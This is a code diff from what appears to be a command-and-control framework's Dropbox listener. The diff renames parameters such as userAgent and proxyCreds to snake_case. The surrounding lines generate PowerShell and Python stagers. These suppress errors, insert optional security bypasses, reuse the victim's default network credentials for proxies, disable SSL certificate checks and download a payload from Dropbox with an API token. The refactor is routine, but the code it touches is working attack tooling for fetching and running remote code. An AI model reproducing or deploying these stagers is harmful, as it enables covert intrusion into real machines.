@@ -165,13 +165,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] = None,
     ):
         """
@@ -203,7 +203,7 @@ class Listener:
 
             # replace with stager = '' for troubleshooting
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
                 for bypass in bypasses:
@@ -212,13 +212,13 @@ class Listener:
 
             stager += "$wc=New-Object System.Net.WebClient;"
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
-            stager += f"$u='{ userAgent }';"
+                user_agent = profile.split("|")[1]
+            stager += f"$u='{ user_agent }';"
 
-            if userAgent.lower() != "none" or proxy.lower() != "none":
-                if userAgent.lower() != "none":
+            if user_agent.lower() != "none" or proxy.lower() != "none":
+                if user_agent.lower() != "none":
                     stager += "$wc.Headers.Add('User-Agent',$u);"
 
                 if proxy.lower() != "none":
@@ -233,13 +233,13 @@ class Listener:
                             $wc.Proxy = $proxy;
                         """
 
-                    if proxyCreds.lower() == "default":
+                    if proxy_creds.lower() == "default":
                         stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
                         # TODO: implement form for other proxy credentials
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         domain = username.split("\\")[0]
                         usr = username.split("\\")[1]
                         stager += f"""
@@ -298,20 +298,20 @@ class Listener:
             launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;"
 
             try:
-                if safeChecks.lower() == "true":
+                if safe_checks.lower() == "true":
                     launcherBase += listener_util.python_safe_checks()
             except Exception as e:
                 p = f"Error setting LittleSnitch in stager: {str(e)}"
                 log.error(p)
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
+                user_agent = profile.split("|")[1]
 
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{ userAgent }';
+                UA='{ user_agent }';
                 t='{ api_token }';
                 server='https://content.dropboxapi.com/2/files/download';
                 req=urllib.request.Request(server);
@@ -328,13 +328,13 @@ class Listener:
                     proto = proxy.Split(":")[0]
                     launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"
 
-                if proxyCreds != "none":
-                    if proxyCreds == "default":
+                if proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
                     else:
                         launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         launcherBase += dedent(
                             f"""
                             proxy_auth_handler.add_password(None,'{ proxy }', '{ username }', '{ password }');
